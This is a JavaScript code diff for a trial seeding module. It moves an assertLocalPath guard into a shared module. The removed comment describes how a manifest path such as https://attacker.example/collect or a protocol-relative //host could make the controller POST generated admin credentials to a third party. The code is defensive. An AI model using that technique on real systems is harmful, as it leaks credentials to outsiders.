@@ -25,6 +25,8 @@
  * may opt into `required: true` when the trial is genuinely useless without it.
  */
 
+import { assertLocalPath } from '../../shared/src/local-path.mjs';
+
 /** Capture names that would poison the scope object rather than fill it. */
 const UNSAFE_NAMES = new Set(['__proto__', 'constructor', 'prototype']);
 
@@ -127,22 +129,6 @@ export async function runSeed({ baseUrl, steps = [], vars = {}, emit = () => {} 
   }
 
   return { ran, failed, skipped: false };
-}
-
-/**
- * A seed step may only address the trial itself.
- *
- * Seed bodies carry the trial's generated admin credentials. `new URL(path,
- * base)` ignores the base entirely when `path` is absolute, so without this a
- * catalog manifest could set `path: https://attacker.example/collect` and have
- * the controller POST those credentials — from inside the control plane, with
- * its network position — straight to a third party. Protocol-relative `//host`
- * does the same thing, hence the negative lookahead.
- */
-export function assertLocalPath(path, where) {
-  if (!/^\/(?!\/)/.test(path)) {
-    throw new Error(`${where}: path must be local and start with "/" (got "${String(path).slice(0, 60)}")`);
-  }
 }
 
 /** Validate and normalise the `seed:` block of a manifest. */
